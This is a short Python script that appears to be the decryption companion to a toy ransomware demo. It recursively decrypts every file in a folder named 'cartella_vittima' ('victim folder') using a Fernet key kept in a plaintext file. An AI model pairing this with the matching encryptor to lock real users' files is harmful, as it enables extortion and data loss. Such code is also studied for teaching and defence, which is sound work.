import os
from cryptography.fernet import Fernet
from pathlib import Path

os.chdir('cartella_vittima')

files: list = []

def find_file(path: str):
    path = Path(path)
    for file in os.listdir(path):
        file = Path(path.joinpath(file))
        if os.path.isfile(file):
            files.append(file.absolute())
        if os.path.isdir(file):
            find_file(file)

find_file('')

os.chdir('..')
if 'key' not in os.listdir():
    key = Fernet.generate_key()
    print(key)

    with open('key', 'wb') as key_:
        key_.write(key)
else:
    with open('key', 'rb') as key_:
        key = key_.read()

path = Path()
os.chdir('cartella_vittima')
for file in files:
    with open(file, 'rb') as file_:
        content = file_.read()
    file = Path(path.joinpath(file))
    with open(file, 'wb') as file_:
        new_content = Fernet(key).decrypt(content)
        file_.write(new_content)
        file_.flush()

print('Work finished with success!')